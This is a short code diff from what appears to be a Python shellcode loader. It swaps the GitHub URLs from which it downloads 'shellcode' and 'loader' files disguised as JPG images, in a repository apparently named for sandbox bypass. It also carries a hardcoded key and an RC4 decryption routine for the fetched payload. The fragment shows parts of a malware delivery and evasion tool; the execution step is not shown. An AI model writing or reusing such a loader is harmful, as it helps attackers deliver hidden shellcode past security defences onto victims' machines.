@@ -28,8 +28,8 @@ def Sandbox():
 '''
 key='123456'
 passwd='123456'
-PayloadFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/shellcode_img1.jpg'
-LoaderFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/loader_img1.jpg'
+PayloadFileLocation='https://raw.githubusercontent.com/Scorpio-m7/pass_sanbox/main/shellcode_img1.jpg'
+LoaderFileLocation='https://raw.githubusercontent.com/Scorpio-m7/pass_sanbox/main/loader_img1.jpg'
 def rc4(text,key):
     key=hashlib.md5(key).hexdigest()
     text=base64.b64decode(text)
